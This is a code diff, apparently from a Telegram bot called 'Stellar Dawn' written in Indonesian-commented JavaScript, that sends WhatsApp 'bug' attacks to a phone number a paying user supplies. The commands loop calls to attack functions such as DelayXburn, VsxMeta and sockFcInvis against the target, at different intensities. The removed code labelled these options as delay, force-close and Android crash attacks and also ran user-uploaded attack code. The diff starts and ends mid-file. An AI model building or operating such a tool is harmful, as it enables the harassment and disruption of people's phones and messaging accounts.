+                    parse_mode: "HTML"
+                }
+            );
+            activePolls.delete(pollMessage.poll.id);
+        } catch (err) {
+            console.log('Error cleanup poll:', err);
+        }
+    }, 60000);
+});
+
+bot.on('poll_answer', async (pollAnswer) => {
+    const pollId = pollAnswer.poll_id;
+    const userId = pollAnswer.user.id;
+    const selectedOptions = pollAnswer.option_ids;
+
+    const pollData = activePolls.get(pollId);
+    if (!pollData) return;
+
+    if (userId !== pollData.userId) {
+        return bot.sendMessage(pollData.chatId, 
+            `⚠️ @${pollAnswer.user.username} — 𝖧𝖺𝗇𝗒𝖺 𝗎𝗇𝗍𝗎𝗄 𝗎𝗌𝖾𝗋 𝗒𝖺𝗇𝗀 𝗋𝖾𝗊𝗎𝖾𝗌𝗍!`
+        );
+    }
+
+    const optionId = selectedOptions[0];
+    let action;
+    switch(optionId) {
+        case 0: action = '30%'; break;
+        case 1: action = '50%'; break;
+        case 2: action = '70%'; break;
+        default: return;
+    }
+
+    try { await bot.deleteMessage(pollData.chatId, pollData.pollMessageId); } 
+    catch (err) { console.log('Error deleting poll:', err); }
+
+    if (action === 'cancel') {
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio  : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖡𝖺𝗍𝖺𝗅
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+                }
+            }
+        );
+        activePolls.delete(pollId);
+        return;
+    }
+
+    await bot.editMessageCaption(
+        `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio   : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+        `,
+        {
+            chat_id: pollData.chatId,
+            message_id: pollData.videoMessageId,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+            }
+        }
+    );
+
+    try {
+        const sock = sessions.values().next().value;
+        const target = `${pollData.targetNumber}@s.whatsapp.net`;
+
+        if (action === '30%') {
+            for (let i = 0; i < 20; i++) {
+                await DelayXburn(sock, target);
+                await sleep(200);
+                  await DelayXburn(sock, target);
+                await sleep(200);
+            }
+        } else if (action === '50%') {
+            for (let i = 0; i < 40; i++) {
+                  await DelayXburn(sock, target);
+                await sleep(200);
+                  await DelayXburn(sock, target);
+                await sleep(200);
+                  await DelayXburn(sock, target);
+                await sleep(200);
+            }
+        }
+        else if (action === '70%') {
+            for (let i = 0; i < 60; i++) {
+                  await DelayXburn(sock, target);
+                await sleep(200);
+                  await DelayXburn(sock, target);
+                await sleep(200);
+                  await DelayXburn(sock, target);
+                await sleep(200);
+                }
+                }
+
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio  : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+                }
+            }
+        );
+
+    } catch (err) {
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
+│─ Error  : ${err.message}
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML"
+            }
+        );
+    }
+
+    activePolls.delete(pollId);
+});
+/// --- ( Case Bug Biasa ) --- \\\
+bot.onText(/\/athena(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    // Validasi format
+    if (!match || !match[1]) {
+        return bot.sendMessage(chatId, 
+            `❌ *Format salah!*\n\nGunakan: /zincy [nomor]\nContoh: /athena 6281234567890`,
+            { parse_mode: "Markdown" }
+        );
+    }
+
+    const targetNumber = match[1];
+    const randomImage = getRandomImage();
+    const date = getCurrentDate();
+    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
 
     const target = `${formattedNumber}@s.whatsapp.net`;
 
@@ -857,9 +1392,9 @@ bot.onText(/\/nezha(?:\s+(\d+))?/, async (msg, match) => {
     const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
 
     if (!isUserPremium) {
-        return bot.sendVideo(chatId, randomVideo, {
+        return bot.sendPhoto(chatId, randomImage, {
             caption: `
-<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
+<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>
 ❌ Akses ditolak. Fitur ini hanya untuk user premium.
 `,
             parse_mode: "HTML",
@@ -874,379 +1409,15 @@ bot.onText(/\/nezha(?:\s+(\d+))?/, async (msg, match) => {
     if (sessions.size === 0) {
         return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
     }
-
-    // KIRIM VIDEO PERTAMA - Status Menunggu Poll
-    const videoMsg = await bot.sendVideo(chatId, randomVideo, {
+const sock = getActiveSock();
+    const sent = await bot.sendPhoto(chatId, randomImage, {
         caption: `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
 │─ Target : ${formattedNumber}
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⏳ 𝖬𝖾𝗇𝗎𝗇𝗀𝗀𝗎 𝖴𝗌𝖾𝗋 𝗆𝖾𝗆𝗂𝗅𝗂𝗁
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-        `,
-        parse_mode: "HTML"
-    });
-
-    // BUAT POLL BENERAN (bukan inline button)
-    const pollMessage = await bot.sendPoll(chatId, 
-        `ПОЖАЛУЙСТА, ВЫБЕРИТЕ`, // Question
-        ['DELAY 𝖠𝖳𝖳𝖠𝖢𝖪', 'F𝖢 𝖨𝖭𝖵𝖨𝖲𝖨𝖡𝖫𝖤', 'CRASH 𝖠𝖭𝖣𝖱𝖮𝖨𝖣', '❌ BATAL'], // Options
-        {
-            is_anonymous: false, 
-            allows_multiple_answers: false, 
-            reply_to_message_id: videoMsg.message_id, 
-            open_period: 60 
-        }
-    );
-
-    // Simpan data poll
-    activePolls.set(pollMessage.poll.id, {
-        chatId,
-        userId,
-        targetNumber: formattedNumber,
-        target,
-        videoMessageId: videoMsg.message_id,
-        pollMessageId: pollMessage.message_id,
-        pollId: pollMessage.poll.id,
-        date,
-        randomVideo
-    });
-
-    setTimeout(async () => {
-        try {
-            const pollData = activePolls.get(pollMessage.poll.id);
-            if (pollData) {
-                await bot.deleteMessage(chatId, pollMessage.message_id);
-                
-                await bot.editMessageCaption(
-                    `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⌛ 𝖤𝗑𝗉𝗂𝗋𝖾𝖽
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ⚠️ Waktu pemilihan habis
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-                    `,
-                    {
-                        chat_id: chatId,
-                        message_id: videoMsg.message_id,
-                        parse_mode: "HTML"
-                    }
-                );
-                
-                activePolls.delete(pollMessage.poll.id);
-            }
-        } catch (err) {
-            console.log('Error cleaning up poll:', err);
-        }
-    }, 60000); // 60 detik
-});
-
-// Handler untuk jawaban poll
-bot.on('poll_answer', async (pollAnswer) => {
-    const pollId = pollAnswer.poll_id;
-    const userId = pollAnswer.user.id;
-    const selectedOptions = pollAnswer.option_ids; // Array of selected option IDs
-
-    // Ambil data poll dari storage
-    const pollData = activePolls.get(pollId);
-    if (!pollData) return;
-
-    // Validasi hanya user yang request yang bisa milih
-    if (userId !== pollData.userId) {
-        return bot.sendMessage(pollData.chatId, 
-            `⚠️ User @${pollAnswer.user.username}. 𝖧𝖺𝗇𝗒𝖺 𝗎𝗇𝗍𝗎𝗄 𝗎𝗌𝖾𝗋 𝗒𝖺𝗇𝗀 𝗋𝖾𝗊𝗎𝖾𝗌𝗍!`
-        );
-    }
-
-    // Map option IDs ke actions
-    const optionId = selectedOptions[0]; // Karena cuma bisa pilih satu
-    let action;
-    switch(optionId) {
-        case 0: action = 'delay'; break;
-        case 1: action = 'force'; break;
-        case 2: action = 'crash'; break;
-        case 3: action = 'cancel'; break;
-        default: return;
-    }
-
-    // Hapus pesan poll
-    try {
-        await bot.deleteMessage(pollData.chatId, pollData.pollMessageId);
-    } catch (err) {
-        console.log('Error deleting poll message:', err);
-    }
-
-    if (action === 'cancel') {
-        // Update video caption jadi dibatalkan
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${pollData.targetNumber}
-│─ 𝖳𝗒𝗉𝖾 : 𝖣𝗂𝖻𝖺𝗍𝖺𝗅𝗄𝖺𝗇
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖡𝖺𝗍𝖺𝗅
-│─ Date   : ${pollData.date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: pollData.chatId,
-                message_id: pollData.videoMessageId,
-                parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${pollData.targetNumber}` }]
-                    ]
-                }
-            }
-        );
-        
-        activePolls.delete(pollId);
-        return;
-    }
-
-    // Update video caption jadi processing
-    await bot.editMessageCaption(
-        `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${pollData.targetNumber}
-│─ 𝖳𝗒𝗉𝖾 : ${action.toUpperCase()} Attack
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌 Send Bug
-│─ Date   : ${pollData.date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-        `,
-        {
-            chat_id: pollData.chatId,
-            message_id: pollData.videoMessageId,
-            parse_mode: "HTML",
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: " 👾「結果を確認」", url: `https://wa.me/${pollData.targetNumber}` }]
-                ]
-            }
-        }
-    );
-
-    try {
-        const target = `${pollData.targetNumber}@s.whatsapp.net`;
-
-        // Eksekusi berdasarkan action
-        if (action === 'force') {
-            for (let i = 0; i < 20; i++) {
-                await sockFcInvis(sock, target);
-                await sleep(500);
-                await sockFcInvis(sock, target);
-            }
-        } else if (action === 'delay') {
-            for (let i = 0; i < 10; i++) {
-                await sockFcInvis(sock, target);
-                await sleep(2000); 
-            }
-        } else if (action === 'crash') {
-            for (let i = 0; i < 30; i++) {
-                await sockFcInvis(sock, target);
-                await sleep(100);
-                await sockFcInvis(sock, target);
-                await sleep(100);
-            }
-        }
-
-        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 ${action.toUpperCase()}`));
-
-        // Update status sukses
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${pollData.targetNumber}
-│─ 𝖳𝗒𝗉𝖾 : ${action.toUpperCase()} 
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
-│─ Date   : ${pollData.date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: pollData.chatId,
-                message_id: pollData.videoMessageId,
-                parse_mode: "HTML",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${pollData.targetNumber}` }]
-                    ]
-                }
-            }
-        );
-
-    } catch (err) {
-        // Update status error
-        await bot.editMessageCaption(
-            `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
-├─────────────────────────┤
-│─ Target : ${pollData.targetNumber}
-│─ 𝖳𝗒𝗉𝖾 : ${action.toUpperCase()} 
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
-│─ Error  : ${err.message}
-│─ Date   : ${pollData.date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-            `,
-            {
-                chat_id: pollData.chatId,
-                message_id: pollData.videoMessageId,
-                parse_mode: "HTML"
-            }
-        );
-    }
-
-    // Hapus data poll
-    activePolls.delete(pollId);
-});
-//////
-
-// Pastikan folder temp ada
-const tempDir = path.join(__dirname, 'temp');
-if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
-
-// Map untuk menyimpan file per user
-const userFiles = new Map(); // key: userId, value: { filePath, used }
-// Handler untuk /uploadfunc - bisa reply file .js atau text berisi kode js
-bot.onText(/\/uploadfunc/, async (msg) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const reply = msg.reply_to_message;
-
-    if (!reply) {
-        return bot.sendMessage(chatId, '❌ Reply ke file .js atau pesan text yang berisi kode JavaScript dengan caption /uploadfunc');
-    }
-
-    let code = '';
-    let fileName = '';
-
-    // Cek apakah reply berupa file document
-    if (reply.document) {
-        const doc = reply.document;
-        if (!doc.file_name.endsWith('.js')) {
-            return bot.sendMessage(chatId, '❌ Hanya file .js yang diperbolehkan');
-        }
-        
-        try {
-            const fileLink = await bot.getFileLink(doc.file_id);
-            const response = await fetch(fileLink);
-            code = await response.text();
-            fileName = doc.file_name;
-        } catch (err) {
-            return bot.sendMessage(chatId, `❌ Gagal mendownload file: ${err.message}`);
-        }
-    }
-    // Cek apakah reply berupa text
-    else if (reply.text) {
-        code = reply.text;
-        fileName = 'code_from_text.js';
-        
-        // Validasi sederhana apakah mengandung module.exports
-        if (!code.includes('module.exports') && !code.includes('exports.')) {
-            return bot.sendMessage(chatId, '❌ Kode harus mengandung module.exports atau exports untuk bisa dieksekusi');
-        }
-    }
-    else {
-        return bot.sendMessage(chatId, '❌ Reply harus berupa file .js atau pesan text berisi kode JavaScript');
-    }
-
-    // Simpan ke file sementara
-    try {
-        const tempFileName = `${userId}_${Date.now()}.js`;
-        const filePath = path.join(tempDir, tempFileName);
-        await writeFile(filePath, code, 'utf8');
-
-        // Hapus file sebelumnya jika ada
-        if (userFiles.has(userId)) {
-            const oldFile = userFiles.get(userId);
-            await unlink(oldFile.filePath).catch(() => {});
-        }
-
-        // Simpan ke map
-        userFiles.set(userId, { filePath, used: false, originalName: fileName });
-
-        bot.sendMessage(chatId, 
-            `✅ *File ${fileName} diterima.*\n` +
-            `📦 Ukuran: ${code.length} bytes\n` +
-            `🔑 Status: Siap digunakan\n\n` +
-            `Sekarang kamu bisa menggunakan:\n` +
-            `*/testfunction [nomor]* - untuk mengeksekusi fungsi (sekali pakai)`,
-            { parse_mode: 'Markdown' }
-        );
-    } catch (err) {
-        bot.sendMessage(chatId, `❌ Gagal menyimpan file: ${err.message}`);
-    }
-});
-
-// Handler untuk /testfunction [nomor] - mirip dengan /zincy tapi pakai fungsi dari file upload
-bot.onText(/\/testfunction(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-
-    // Validasi format nomor
-    if (!match || !match[1]) {
-        return bot.sendMessage(chatId, 
-            `❌ *Format salah!*\n\nGunakan: /testfunction [nomor]\nContoh: /testfunction 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    // Cek file upload
-    const fileData = userFiles.get(userId);
-    if (!fileData) {
-        return bot.sendMessage(chatId, '❌ Kamu belum upload file. Gunakan /uploadfunc dulu');
-    }
-    if (fileData.used) {
-        return bot.sendMessage(chatId, '❌ File sudah digunakan. Upload file baru untuk menggunakan lagi');
-    }
-
-    const targetNumber = match[1];
-    const randomVideo = getRandomVideo();
-    const date = getCurrentDate();
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
-
-    // Validasi panjang nomor
-    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
-        return bot.sendMessage(chatId, 
-            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /testfunction 6281234567890`,
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    // Cek koneksi WhatsApp
-    if (sessions.size === 0) {
-        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
-    }
-
-    const target = `${formattedNumber}@s.whatsapp.net`;
-
-    // Kirim video processing
-    const sent = await bot.sendVideo(chatId, randomVideo, {
-        caption: `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾 (Test Function)
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ File    : ${fileData.originalName}
 │─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
 │─ Date   : ${date}
-└─────────────────────────┘</blockquote>
+└─────────────────────────┘
  ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
 `,
         parse_mode: "HTML"
@@ -1255,17 +1426,14 @@ bot.onText(/\/testfunction(?:\s+(\d+))?/, async (msg, match) => {
     try {
         await sleep(1000);
 
-        // Edit caption pertama
         await bot.editMessageCaption(
             `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾 (Test Function)
-├─────────────────────────┤
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
 │─ Target : ${formattedNumber}
-│─ File    : ${fileData.originalName}
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖬𝖾𝗆𝗎𝖺𝗍 𝖥𝗎𝗇𝗀𝗌𝗂...
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
 │─ Date   : ${date}
-└─────────────────────────┘</blockquote>
+└─────────────────────────┘
  ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
             `,
             {
@@ -1274,163 +1442,156 @@ bot.onText(/\/testfunction(?:\s+(\d+))?/, async (msg, match) => {
                 parse_mode: "HTML",
                 reply_markup: {
                     inline_keyboard: [
-                        [{ text: " 👾「Cek Nomor」", url: `https://wa.me/${formattedNumber}` }]
+                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
                     ]
                 }
             }
         );
 
-        // Load dan eksekusi fungsi dari file upload
-        try {
-            // Hapus dari cache require
-            const resolvedPath = require.resolve(fileData.filePath);
-            if (require.cache[resolvedPath]) {
-                delete require.cache[resolvedPath];
-            }
-
-            // Require file
-            const userModule = require(fileData.filePath);
-
-            // Validasi module
-            if (typeof userModule !== 'function' && (!userModule || typeof userModule.run !== 'function')) {
-                throw new Error('File harus mengekspor function atau object dengan method run');
-            }
-
-            // Eksekusi fungsi dengan parameter target dan sock
-            let sendFunction;
-            if (typeof userModule === 'function') {
-                sendFunction = userModule;
-            } else {
-                sendFunction = userModule.run;
-            }
-
-            // Loop 20x dengan sleep 500ms (seperti di kode asli)
-            for (let i = 0; i < 20; i++) {
-                // Update status setiap 5 iterasi
-                if (i % 5 === 0) {
-                    await bot.editMessageCaption(
-                        `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾 (Test Function)
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ File    : ${fileData.originalName}
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖬𝖾𝗇𝗀𝗂𝗋𝗂𝗆... (${i+1}/20)
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-                        `,
-                        {
-                            chat_id: chatId,
-                            message_id: sent.message_id,
-                            parse_mode: "HTML",
-                            reply_markup: {
-                                inline_keyboard: [
-                                    [{ text: " 👾「Cek Nomor」", url: `https://wa.me/${formattedNumber}` }]
-                                ]
-                            }
-                        }
-                    );
-                }
-
-                // Panggil fungsi dari file upload
-                await sendFunction(sock, target);
-                await sleep(500);
-                await sendFunction(sock, target);
-            }
-
-            console.log(chalk.green(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Test Function ke ${formattedNumber}`));
-
-            // Update status sukses
-            await bot.editMessageCaption(
-                `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾 (Test Function)
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ File    : ${fileData.originalName}
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒 ✅
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-                `,
-                {
-                    chat_id: chatId,
-                    message_id: sent.message_id,
-                    parse_mode: "HTML",
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: " 👾「Cek Nomor」", url: `https://wa.me/${formattedNumber}` }]
-                        ]
-                    }
-                }
-            );
-
-            // Tandai file sudah digunakan dan hapus
-            fileData.used = true;
-            await unlink(fileData.filePath).catch(() => {});
-            userFiles.delete(userId);
-
-        } catch (funcError) {
-            // Error dari fungsi upload
-            await bot.editMessageCaption(
-                `
-<blockquote>┌─────────────────────────┐
-│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾 (Test Function)
-├─────────────────────────┤
-│─ Target : ${formattedNumber}
-│─ File    : ${fileData.originalName}
-│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖤𝗋𝗋𝗈𝗋 ❌
-│─ Error   : ${funcError.message.substring(0, 50)}
-│─ Date   : ${date}
-└─────────────────────────┘</blockquote>
- ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
-                `,
-                {
-                    chat_id: chatId,
-                    message_id: sent.message_id,
-                    parse_mode: "HTML",
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: " 👾「Cek Nomor」", url: `https://wa.me/${formattedNumber}` }]
-                        ]
-                    }
-                }
-            );
-
-            // File tetap dihapus karena error
-            await unlink(fileData.filePath).catch(() => {});
-            userFiles.delete(userId);
-            
-            // Log error
-            console.log(chalk.red(`(本) Error Test Function: ${funcError.message}`));
+        for (let i = 0; i < 5; i++) {
+            await VsxMeta(sock, target);
+            await sleep(500);
+            await VsxMeta(sock, target);
+            await sleep(500);
         }
 
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : Succes
+│─ Date   : ${date}
+└─────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: chatId,
+                message_id: sent.message_id,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
+                    ]
+                }
+            }
+        );
     } catch (err) {
-        await bot.sendMessage(chatId, `❌ Gagal menjalankan test function: ${err.message}`);
+        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
     }
 });
-
-// Command untuk melihat status file
-bot.onText(/\/statusfunc/, async (msg) => {
+bot.onText(/\/thea(?:\s+(\d+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
-    const fileData = userFiles.get(userId);
-    if (!fileData) {
-        return bot.sendMessage(chatId, '📭 Belum ada file yang diupload');
+    // Validasi format
+    if (!match || !match[1]) {
+        return bot.sendMessage(chatId, 
+            `❌ *Format salah!*\n\nGunakan: /zincy [nomor]\nContoh: /zincy 6281234567890`,
+            { parse_mode: "Markdown" }
+        );
     }
 
-    bot.sendMessage(chatId,
-        `📊 *Status File*\n\n` +
-        `📁 Nama: ${fileData.originalName}\n` +
-        `🔑 Status: ${fileData.used ? '❌ Sudah digunakan' : '✅ Belum digunakan'}\n` +
-        `📍 Lokasi: ${fileData.filePath}`,
-        { parse_mode: 'Markdown' }
-    );
-});
+    const targetNumber = match[1];
+    const randomImage = getRandomImage();
+    const date = getCurrentDate();
+    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
 
-/// --- ( Case Bug Biasa ) --- \\\
+    const target = `${formattedNumber}@s.whatsapp.net`;
+
+    // Periksa status premium user
+    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
+
+    if (!isUserPremium) {
+        return bot.sendPhoto(chatId, randomImage, {
+            caption: `
+<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>
+❌ Akses ditolak. Fitur ini hanya untuk user premium.
+`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
+                ]
+            }
+        });
+    }
+
+    if (sessions.size === 0) {
+        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
+    }
+const sock = getActiveSock();
+    const sent = await bot.sendPhoto(chatId, randomImage, {
+        caption: `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
+│─ Date   : ${date}
+└─────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+`,
+        parse_mode: "HTML"
+    });
+
+    try {
+        await sleep(1000);
+
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
+│─ Date   : ${date}
+└─────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: chatId,
+                message_id: sent.message_id,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
+                    ]
+                }
+            }
+        );
+
+        for (let i = 0; i < 5; i++) {
